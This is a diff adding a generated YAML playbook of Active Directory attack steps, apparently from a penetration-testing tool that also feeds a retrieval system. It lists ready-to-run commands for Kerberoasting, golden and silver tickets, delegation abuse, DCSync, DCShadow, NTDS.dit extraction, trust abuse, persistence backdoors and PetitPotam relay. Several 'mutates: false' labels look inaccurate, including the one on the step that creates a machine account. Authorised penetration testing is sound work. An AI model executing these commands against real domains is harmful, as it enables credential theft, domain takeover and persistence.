@@ -1,0 +1,240 @@
+# GENERATED from active_directory_attacks.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: active_directory_attacks
+title: Active Directory Attack Methodology
+source: active_directory_attacks.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: kerberos-attacks
+  name: Kerberos Attacks
+  steps:
+  - id: kerberos-attacks.kerberoasting
+    title: Kerberoasting
+    access_required: credential
+    mutates: false
+    source_line: 12
+    commands:
+    - lang: powershell
+      command: Rubeus.exe kerberoast /outfile:hashes.txt
+    - lang: powershell
+      command: GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request
+    - lang: powershell
+      command: Invoke-Kerberoast -OutputFormat Hashcat | Select Hash | Out-File hashes.txt
+    - lang: bash
+      command: hashcat -m 13100 hashes.txt wordlist.txt
+  - id: kerberos-attacks.as-rep-roasting
+    title: AS-REP Roasting
+    access_required: none
+    mutates: false
+    source_line: 31
+    commands:
+    - lang: powershell
+      command: Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+    - lang: powershell
+      command: GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat
+    - lang: bash
+      command: hashcat -m 18200 asrep.txt wordlist.txt
+  - id: kerberos-attacks.golden-ticket
+    title: Golden Ticket
+    access_required: credential
+    mutates: false
+    source_line: 47
+    commands:
+    - lang: powershell
+      command: mimikatz# lsadump::dcsync /domain:domain.local /user:krbtgt
+    - lang: powershell
+      command: mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH
+        /ptt
+    - lang: powershell
+      command: ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
+  - id: kerberos-attacks.silver-ticket
+    title: Silver Ticket
+    access_required: credential
+    mutates: false
+    source_line: 61
+    commands:
+    - lang: powershell
+      command: mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:dc01.domain.local
+        /service:cifs /rc4:SERVICE_HASH /ptt
+- id: delegation-attacks
+  name: Delegation Attacks
+  steps:
+  - id: delegation-attacks.unconstrained-delegation
+    title: Unconstrained Delegation
+    access_required: none
+    mutates: false
+    source_line: 73
+    commands:
+    - lang: powershell
+      command: Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+    - lang: powershell
+      command: Get-DomainComputer -Unconstrained
+    - lang: powershell
+      command: Rubeus.exe monitor /interval:5
+  - id: delegation-attacks.constrained-delegation
+    title: Constrained Delegation
+    access_required: credential
+    mutates: false
+    source_line: 87
+    commands:
+    - lang: powershell
+      command: Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+    - lang: powershell
+      command: Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local
+        /ptt
+  - id: delegation-attacks.resource-based-constrained-delegation-rbcd
+    title: Resource-Based Constrained Delegation (RBCD)
+    access_required: credential
+    mutates: false
+    source_line: 98
+    commands:
+    - lang: powershell
+      command: New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!'
+        -AsPlainText -Force)
+    - lang: powershell
+      command: Set-ADComputer target$ -PrincipalsAllowedToDelegateToAccount FAKE01$
+    - lang: powershell
+      command: Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local
+        /ptt
+- id: domain-controller-attacks
+  name: Domain Controller Attacks
+  steps:
+  - id: domain-controller-attacks.dcsync
+    title: DCSync
+    access_required: credential
+    mutates: false
+    source_line: 116
+    commands:
+    - lang: powershell
+      command: mimikatz# lsadump::dcsync /domain:domain.local /user:Administrator
+    - lang: powershell
+      command: mimikatz# lsadump::dcsync /domain:domain.local /all /csv
+    - lang: powershell
+      command: secretsdump.py domain.local/admin:password@dc01.domain.local
+  - id: domain-controller-attacks.dcshadow
+    title: DCShadow
+    access_required: none
+    mutates: false
+    source_line: 128
+    commands:
+    - lang: powershell
+      command: mimikatz# lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512
+    - lang: powershell
+      command: mimikatz# lsadump::dcshadow /push
+  - id: domain-controller-attacks.ntds-dit-extraction
+    title: NTDS.dit Extraction
+    access_required: none
+    mutates: false
+    source_line: 137
+    commands:
+    - lang: powershell
+      command: 'vssadmin create shadow /for=C:'
+    - lang: powershell
+      command: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
+    - lang: powershell
+      command: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+    - lang: powershell
+      command: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+- id: trust-abuse
+  name: Trust Abuse
+  steps:
+  - id: trust-abuse.parent-child-domain-trust
+    title: Parent-Child Domain Trust
+    access_required: credential
+    mutates: false
+    source_line: 156
+    commands:
+    - lang: powershell
+      command: mimikatz# lsadump::trust /patch
+    - lang: powershell
+      command: mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID
+        /sids:ENTERPRISE_ADMINS_SID /krbtgt:TRUST_KEY /ptt
+  - id: trust-abuse.forest-trust-abuse
+    title: Forest Trust Abuse
+    access_required: credential
+    mutates: false
+    source_line: 167
+    commands:
+    - lang: powershell
+      command: mimikatz# kerberos::golden /user:Administrator /domain:forest1.local /sid:FOREST1_SID /sids:FOREST2_ENTERPRISE_ADMINS
+        /krbtgt:HASH /ptt
+- id: persistence-techniques
+  name: Persistence Techniques
+  steps:
+  - id: persistence-techniques.adminsdholder-backdoor
+    title: AdminSDHolder Backdoor
+    access_required: shell
+    mutates: true
+    source_line: 179
+    commands:
+    - lang: powershell
+      command: Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity
+        backdoor_user -Rights All
+    - lang: powershell
+      command: Invoke-ADSDPropagation
+  - id: persistence-techniques.shadow-credentials
+    title: Shadow Credentials
+    access_required: shell
+    mutates: true
+    source_line: 190
+    commands:
+    - lang: powershell
+      command: Whisker.exe add /target:dc01$ /domain:domain.local /dc:dc01.domain.local
+    - lang: powershell
+      command: Rubeus.exe asktgt /user:dc01$ /certificate:cert.pfx /password:pass /ptt
+  - id: persistence-techniques.adcs-abuse-petitpotam-ntlm-relay
+    title: ADCS Abuse (PetitPotam + NTLM Relay)
+    access_required: shell
+    mutates: true
+    source_line: 201
+    commands:
+    - lang: bash
+      command: ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template
+        DomainController
+    - lang: bash
+      command: PetitPotam.py attacker_ip dc01.domain.local
+    - lang: bash
+      command: Rubeus.exe asktgt /user:dc01$ /certificate:base64_cert /ptt
+- id: reconnaissance-commands
+  name: Reconnaissance Commands
+  steps:
+  - id: reconnaissance-commands.powerview-enumeration
+    title: PowerView Enumeration
+    access_required: none
+    mutates: false
+    source_line: 219
+    commands:
+    - lang: powershell
+      command: Get-Domain
+    - lang: powershell
+      command: Get-DomainController
+    - lang: powershell
+      command: Get-DomainUser -AdminCount
+    - lang: powershell
+      command: Get-DomainGroup -AdminCount
+    - lang: powershell
+      command: Get-DomainGroupMember "Domain Admins"
+    - lang: powershell
+      command: Get-DomainComputer -TrustedToAuth
+    - lang: powershell
+      command: Get-DomainUser -TrustedToAuth
+    - lang: powershell
+      command: Find-InterestingDomainAcl -ResolveGUIDs
+  - id: reconnaissance-commands.bloodhound-collection
+    title: BloodHound Collection
+    access_required: credential
+    mutates: false
+    source_line: 238
+    commands:
+    - lang: powershell
+      command: SharpHound.exe -c All
+    - lang: powershell
+      command: bloodhound-python -d domain.local -u user -p pass -ns 10.10.10.1 -c All
